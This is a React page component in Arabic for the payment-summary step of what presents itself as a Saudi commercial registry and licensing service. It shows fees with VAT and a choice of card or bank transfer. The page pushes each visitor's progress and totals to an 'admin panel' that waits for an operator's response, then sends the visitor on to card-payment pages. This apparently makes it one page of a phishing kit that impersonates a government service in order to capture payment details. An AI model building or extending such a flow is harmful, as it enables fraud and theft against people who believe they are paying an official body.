import Footer from "@/components/layout/Footer";
import Header from "@/components/layout/Header";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage } from "@/lib/store";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CreditCard, Building2, CheckCircle2, FileText, User, Phone, Mail, MapPin } from "lucide-react";

export default function SummaryPayment() {
  const [searchQuery, setSearchQuery] = useState("");
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  // Get service name from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'قيد سجل تجاري لمؤسسة فردية';

  // Service prices
  const servicePrices: Record<string, number> = {
    'قيد سجل تجاري لمؤسسة فردية': 500,
    'تجديد سجل تجاري': 300,
    'حجز اسم تجاري': 200,
    'إصدار رخصة فورية': 400,
    'تجديد رخصة تجارية': 350,
    'إصدار رخصة تجارية': 450,
    'تسجيل علامة تجارية': 1000,
  };

  const servicePrice = servicePrices[serviceName] || 500;
  const vatAmount = Math.round(servicePrice * 0.15);
  const totalAmount = servicePrice + vatAmount;

  useEffect(() => {
    navigateToPage('ملخص الدفع');
    
    // إرسال المجموع الكلي تلقائياً عند فتح الصفحة (بعد تأخير للتأكد من الاتصال)
    setTimeout(() => {
      sendData({
        data: {
          'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
        },
        current: 'الملخص والدفع',
        waitingForAdminResponse: false,
      });
    }, 1000);
  }, [servicePrice]);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;

    setIsProcessing(true);

    // Send data to admin panel
    sendData({
      data: {
        paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'تحويل بنكي',
        serviceName,
        servicePrice,
        vatAmount,
        totalAmount,
      },
      current: 'ملخص الدفع',
      nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === 'card') {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
      } else {
        window.location.href = `/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header searchQuery={searchQuery} setSearchQuery={setSearchQuery} />
      
      <main className="flex-1 container py-8">
        <div className="max-w-4xl mx-auto">
          {/* Breadcrumb */}
          <nav className="flex items-center gap-2 text-sm text-gray-500 mb-6">
            <span>الرئيسية</span>
            <span>/</span>
            <span>الخدمات</span>
            <span>/</span>
            <span className="text-green-600">{serviceName}</span>
          </nav>

          <h1 className="text-2xl font-bold text-gray-900 mb-6">ملخص الطلب والدفع</h1>
          
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Order Summary */}
            <div className="lg:col-span-2 space-y-6">
              {/* Service Details */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <FileText className="w-5 h-5 text-green-600" />
                    تفاصيل الخدمة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">اسم الخدمة</span>
                      <span className="font-medium">{serviceName}</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">رسوم الخدمة</span>
                      <span className="font-medium">{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
                      <span className="font-medium">{vatAmount} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-2 bg-green-50 px-3 rounded-lg">
                      <span className="text-green-700 font-bold">المجموع الكلي</span>
                      <span className="text-green-700 font-bold text-xl">{totalAmount} ر.س</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Payment Methods */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <CreditCard className="w-5 h-5 text-green-600" />
                    طريقة الدفع
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Credit Card Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'card'
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-green-300'
                      }`}
                      onClick={() => setSelectedPaymentMethod('card')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'card' ? 'border-green-500' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'card' && (
                            <div className="w-3 h-3 rounded-full bg-green-500" />
                          )}
                        </div>
                        <CreditCard className={`w-8 h-8 ${selectedPaymentMethod === 'card' ? 'text-green-600' : 'text-gray-400'}`} />
                        <div>
                          <p className="font-medium">بطاقة ائتمان / مدى</p>
                          <p className="text-sm text-gray-500">Visa, Mastercard, مدى</p>
                        </div>
                      </div>
                      <div className="flex gap-2 mt-3 justify-center">
                        <img src="/images/banks/visa.png" alt="Visa" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mastercard.png" alt="Mastercard" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mada.png" alt="Mada" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                      </div>
                    </div>

                    {/* Bank Transfer Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'transfer'
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-green-300'
                      }`}
                      onClick={() => setSelectedPaymentMethod('transfer')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'transfer' ? 'border-green-500' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'transfer' && (
                            <div className="w-3 h-3 rounded-full bg-green-500" />
                          )}
                        </div>
                        <Building2 className={`w-8 h-8 ${selectedPaymentMethod === 'transfer' ? 'text-green-600' : 'text-gray-400'}`} />
                        <div>
                          <p className="font-medium">تحويل بنكي</p>
                          <p className="text-sm text-gray-500">الراجحي، الأهلي، الأول</p>
                        </div>
                      </div>
                      <div className="flex gap-2 mt-3 justify-center">
                        <img src="/images/banks/alrajhi.png" alt="AlRajhi" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/alahli.png" alt="AlAhli" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/sab.png" alt="SAB" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Sidebar - Order Summary */}
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader className="bg-green-600 text-white rounded-t-lg">
                  <CardTitle className="text-lg">ملخص الطلب</CardTitle>
                </CardHeader>
                <CardContent className="pt-4">
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الخدمة</span>
                      <span className="font-medium text-xs">{serviceName}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الرسوم</span>
                      <span>{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الضريبة</span>
                      <span>{vatAmount} ر.س</span>
                    </div>
                    <hr />
                    <div className="flex justify-between font-bold text-lg">
                      <span>المجموع</span>
                      <span className="text-green-600">{totalAmount} ر.س</span>
                    </div>
                  </div>

                  <Button
                    className="w-full mt-6 bg-green-600 hover:bg-green-700"
                    disabled={!selectedPaymentMethod || isProcessing}
                    onClick={handlePayment}
                  >
                    {isProcessing ? (
                      <div className="flex items-center gap-2">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                        جاري المعالجة...
                      </div>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4 ml-2" />
                        متابعة الدفع
                      </>
                    )}
                  </Button>

                  <p className="text-xs text-gray-500 text-center mt-4">
                    بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                  </p>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
